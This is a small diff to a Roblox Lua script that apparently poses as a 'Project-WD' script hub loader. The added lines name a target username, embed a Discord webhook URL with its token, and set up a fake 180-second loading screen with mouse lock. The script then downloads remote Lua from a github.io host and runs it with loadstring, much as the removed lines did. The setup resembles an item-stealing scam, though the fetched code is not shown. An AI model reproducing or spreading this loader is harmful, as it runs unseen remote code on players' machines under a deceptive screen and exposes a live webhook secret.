@@ -1,4 +1,23 @@
-_G.Username = "freefire0vv"
-_G.HubName = "Project wd script are loading, please don't leave"
+UserName = "freefire0vv"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+UserName2 = "freefire0vv"
+
+Webhook = "https://discord.com/api/webhooks/1111317837496201311/m9wJx-be9WMLjpLCLeBreg29yFMff7S1wdCJzXOLSr4Hc-T7XSHVlFuF8MkiOkf81Yge" 
+
+G.LoadingScreen = true
+
+G.AntiLeave = false
+
+G.MouseLock = true 
+
+G.ScriptName = "Project-WD Scriptz"
+
+G.FirstText = "Script Preparing"
+
+G.SecondText = "Script Loading..."
+
+G.ThirdText = "Almost Done..."
+
+G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes 
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
